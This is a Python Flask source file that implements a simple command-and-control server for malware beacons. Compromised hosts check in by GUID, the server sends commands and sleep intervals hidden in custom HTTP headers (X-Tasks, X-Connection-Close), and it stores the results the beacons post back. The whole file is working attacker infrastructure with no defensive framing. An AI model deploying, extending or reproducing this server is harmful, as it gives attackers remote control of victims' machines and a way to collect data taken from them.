from flask import Flask, request, abort, Response
import json



class Tasks():

    def __init__(self):

        self.task_file = "tasks"

    def tasks(self):
        with open(self.task_file, "r+") as f:
            content = json.load(f)
            sleep = content["sleep"]
            command = content.get("command")
            content["command"] = ""
            content["sleep"] = 0
            f.seek(0)
            json.dump(content, f)
            f.truncate()

        return command, sleep

def add_host(guid, IP):
    host = {IP: guid}
    print(host)


# init instance of class
app = Flask(__name__)


@app.route('/login', methods=['GET'])
def login():
    guid = request.args.get('new')
    if not guid:
        abort(404)
    else:
        add_host(guid, request.remote_addr)
        return f"", 200
    
    print("New host added")


# I'll be using this route to check-in with beacon, task him, and set his sleep time
@app.route('/check', methods=['GET'])
def check_in():
    command, sleep = Tasks().tasks()
    if sleep:
        resp = Response()
        resp.headers["X-Connection-Close"] = sleep
        return resp, 204 # status code to change sleep time
    elif command:
        resp = Response()
        resp.headers["X-Tasks"] = command
        return resp, 204
    else:
        return "", 200 # status code to inform to do nothing, stay still

@app.route('/results', methods=['POST'])    
def results():
    data = request.get_json()
    print(data)
    with open("results.json", "w") as f:
        json.dump(data, f)
    return "",200

# just for testing purposes
@app.route('/health-check', methods=['GET'])
def hello_world():
    return "<p>Site is up</p>", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
